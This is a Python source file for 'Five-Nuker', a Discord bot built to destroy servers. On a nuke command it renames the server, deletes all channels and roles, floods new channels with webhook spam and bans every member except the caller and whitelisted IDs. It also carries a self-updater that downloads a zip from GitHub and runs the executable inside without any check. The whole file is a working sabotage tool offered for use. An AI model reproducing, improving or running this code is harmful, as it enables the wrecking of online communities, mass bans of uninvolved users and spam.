import discord
from discord.ext import commands
import json
import os
from colorama import Fore as F
from modules import *
from asyncio import create_task
from random import choice
from time import sleep
import logging
import webbrowser
import urllib3
import zipfile
import urllib.request
import shutil

logging.getLogger("discord.http").disabled = True
logging.getLogger("discord.client").disabled = True
logging.getLogger("discord.gateway").disabled = True
os.system("title Five-Nuker")

def stop_nuker():
    if os.name == "nt":
        os.system("pause")
    quit()

def clear():
    if os.name=='nt':
        os.system('cls')
    else:
        os.system('clear')


def start_update():
    Center("Running the nuker update...")

    urllib.request.urlretrieve("https://github.com/glitch65/Five-nuker/raw/Rework/updater.zip", "updater.zip")
    
    with zipfile.ZipFile("updater.zip", "r") as updater:
        updater.extractall()
    
    os.system("updater.exe")

if os.path.exists("updated"):
    os.system('taskkill /f /im updater.exe')
    sleep(2)
    os.remove("updater.exe")
    shutil.rmtree("_updater-stuff")
    os.remove("updated")
    clear()


local_version = str("0.1.1")

http = urllib3.PoolManager()

get_last_ver = http.request('GET', 'https://raw.githubusercontent.com/glitch65/Five-nuker/ver_reborn/curent_version')

get_last_ver = get_last_ver.data.decode('utf-8')

if not local_version == get_last_ver:
    Center("New version of Five-nuker avaible!")
    Center(f"{local_version} -> {get_last_ver}")
    if os.name == "nt":
        start_update()
    else:
        Center("Opening a page with download and with a changelog after a few seconds...")
        sleep(3)
        webbrowser.open("https://github.com/glitch65/Five-nuker/releases")





raw_image = """  █████▒██▓ ██▒   █▓▓█████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓██   ▒▓██▒▓██░   █▒▓█   ▀     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒████ ░▒██▒ ▓██  █▒░▒███      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█▒  ░░██░  ▒██ █░░▒▓█  ▄    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒█░   ░██░   ▒▀█░  ░▒████▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
 ▒ ░   ░▓     ░ ▐░  ░░ ▒░ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░      ▒ ░   ░ ░░   ░ ░  ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░    ▒ ░     ░░     ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
        ░        ░     ░  ░            ░    ░     ░  ░      ░  ░   ░     
                ░                                                        """
raw_image1 =f"""
\n\n\n{raw_image}\n\n\n"""

CenterColor(raw_image1,((125,0,255),(0,0,0)), len(raw_image.split("\n")),"V")

if not os.path.exists("cfg"):
    os.mkdir("cfg")
    with open("cfg/config.json", "w") as cfg:
        config = {
            "token": "TOKENHERE",
            "prefix": "!",
            "nuke_prefix": ".",
            "names_of_channels_and_roles": ["Paste here your channel names"],
            "name_of_webhooks": "Five Nuker",
            "spam_text": "Paste here your spam text",
            "spam_mode": 1,
            "channels_create_count": 10,
            "spam_in_channel_count": 10,
            "server_name": "Nuked by Five Nuker",
            "whitelisted_ids": [1207760690899849350, 743781026534260836],
            "only_whitelisted_users_can_perform_actions": False,
            "ban_reason": "XDDDDDDDDDDDDDDDDDDDDDDDD",
            "invisible_mode": False,
            "Enable_activity": True,
            "Activity_type": "playing",
            "Activity_name": "Five Nuker on TOP!"
        }
        json.dump(config,cfg,indent=3)
    print(f"{F.YELLOW}cfg/config.json not exists, created a config file!\nPlease check and edit a cfg/config.json!{F.RESET}")
    stop_nuker()
if os.path.exists("cfg/config.json"):
    try:
        with open("cfg/config.json", "r") as cfg:
            config = json.loads(cfg.read())
        print(f"{F.GREEN}Config file loaded!{F.RESET}")
    except Exception as e:
        print("failed to load the config :(")
        print(f"{e}")
else:
    with open("cfg/config.json", "w") as cfg:
        config = {
            "token": "TOKENHERE",
            "prefix": "!",
            "nuke_prefix": ".",
            "names_of_channels_and_roles": ["Paste here your channel names"],
            "name_of_webhooks": "Five Nuker",
            "spam_text": "Paste here your spam text",
            "spam_mode": 1,
            "channels_create_count": 10,
            "spam_in_channel_count": 10,
            "server_name": "Nuked by Five Nuker",
            "whitelisted_ids": [1207760690899849350, 743781026534260836],
            "only_whitelisted_users_can_perform_actions": False,
            "ban_reason": "XDDDDDDDDDDDDDDDDDDDDDDDD",
            "invisible_mode": False,
            "Activity_type": "playing",
            "Activity_name": "Five Nuker on TOP!"
        }
        json.dump(config,cfg,indent=3)
    print(f"{F.YELLOW}cfg/config.json not exists, created a config file!\nPlease check and edit a cfg/config.json!{F.RESET}")
    stop_nuker()

with open('icon.png', 'rb') as f:
    icon = f.read()



bot = commands.Bot(config['prefix'],intents=discord.Intents.all(),help_command=None)

@bot.event
async def on_ready():
    clear()
    os.system("cls")
    os.system(f"title Five Nuker - Online - {bot.user} - ")
    CenterColor(raw_image1,((125,0,255),(0,0,0)), len(raw_image.split("\n")),"V")
    CenterColor(f"You loggen by {bot.user}",((7,227,0),(7,145,3),(6,214,0),(5,138,1),(5,102,2),(4,117,2),(4,92,2)), len(f"You loggen by {bot.user}"),"H")
    
    if config["Activity_type"] == "playing" and config["invisible_mode"] == False:
        await bot.change_presence(activity=discord.Game(name=config["Activity_name"]))
    elif config["Activity_type"] == "listening" and config["invisible_mode"] == False:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=config["Activity_name"]))
    elif config["Activity_type"] == "streaming" and config["invisible_mode"] == False:
        await bot.change_presence(activity=discord.Streaming(name=config["Activity_name"], url='https://www.twitch.tv/'))
    elif config["Activity_type"] == "watching" and config["invisible_mode"] == False:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=config["Activity_name"]))
    elif config["Activity_type"] == None and config["invisible_mode"] == True:
        await bot.change_presence(status=discord.Status.offline)
        CenterColor("Invisible mode enabled!",((163,163,163),(133,133,133),(99,99,99)), 21,"H")   
    else:
        CenterColor("ERROR!!! Activity_type must be playing, listening, streaming, watching or null. invisible_mode must be true or false. The bot's activity will not change and invisible mode will not be enabled",((255,0,0),(176,0,0)),len("ERROR!!! Activity_type must be playing, listening, streaming, watching or null. invisible_mode must be true or false. The bot's activity will not change and invisible mode will not be enabled"),"H")

    Center(f"Message logs:")  



async def send_wb(object: discord.TextChannel,count):
        
    for i in range(count):
        try: await object.send(config['spam_text'])
        
        except Exception as e:
            print(e)

async def create_channels(guild,count: int):
        try:
            channel = await guild.create_text_channel(name=choice(config['names_of_channels_and_roles']))
            wb = await channel.create_webhook(name=config['name_of_webhooks'], avatar=icon)
            await send_wb(wb,count)
        except Exception as e:
            print(e)

async def delete_channels(guild: discord.Guild):
        for i in guild.channels:
            try:
                create_task(i.delete())
            except Exception as e:
                print(e)
async def delete_roles(guild: discord.Guild):
    for i in guild.roles:
        try:
            await i.delete()
        except:
            pass





async def banAll(ctx):
    all_members_list = list(ctx.guild.members)
    all_members_list.remove(ctx.author)
    for i in config['whitelisted_ids']:
        try:
            all_members_list.remove(bot.get_user(i))
        except: pass
    for i in all_members_list:
        try:
            create_task(i.ban(reason=config['ban_reason'], delete_message_days=7))
        except: pass


@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    msg = message.content
    if msg.startswith(config["nuke_prefix"]):
        CenterColor(f"[{message.author}]:{msg}",((0,255,0),(0,125,0),(0,255,0)), len(f"[{message.author}]: {msg}"),"H")
        args = msg.split()
        if args[0] == config['nuke_prefix']+"nuke":
            if config['only_whitelisted_users_can_perform_actions'] == True:
                if message.author.id in config['whitelisted_ids']:
                    await message.guild.edit(name=config["server_name"], icon=icon)
                    spamCount = config['spam_in_channel_count']
                    channelsCreate = config['channels_create_count']
                    CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {channelsCreate} | Channels Count: {spamCount}",((255,0,0),(255,0,0)), 1,"H")
                    create_task(delete_channels(message.guild,))
                    create_task(delete_roles(message.guild,))
                    for i in range(channelsCreate):
                        create_task(create_channels(message.guild,spamCount))
                    create_task(banAll(message))
            else:
                await message.guild.edit(name=config["server_name"], icon=icon)
                spamCount = config['spam_in_channel_count']
                channelsCreate = config['channels_create_count']
                CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {channelsCreate} | Channels Count: {spamCount}",((255,0,0),(255,0,0)), 1,"H")
                create_task(delete_channels(message.guild,))
                create_task(delete_roles(message.guild,))
                for i in range(channelsCreate):
                    create_task(create_channels(message.guild,spamCount))
                create_task(banAll(message))


    elif msg.startswith(config["prefix"]):
        CenterColor(f"[{message.author}]:{msg}",((0,255,255),(0,125,125),(0,255,255)), len(f"[{message.author}]: {msg}"),"H")
    elif msg.startswith("@everyone") or msg.startswith("@here") or msg.startswith(f"<@{bot.user.id}>"):
        CenterColor(f"[{message.author}]:{msg}",((255,255,0),(125,125,0),(255,255,0)), len(f"[{message.author}]: {msg}"),"H")
    else:
        Center(f"[{message.author}]: {msg}")

try: bot.run(config['token'])
except Exception as e:
    gradientText(((255,0,0),(255,0,0)),1,f"[ERROR] Token incorrect! Please send your error message to our support!\n\nError message: {e}","H")
    sleep(3)
    webbrowser.open("https://discord.gg/QTDXqt8PA8")
    stop_nuker()

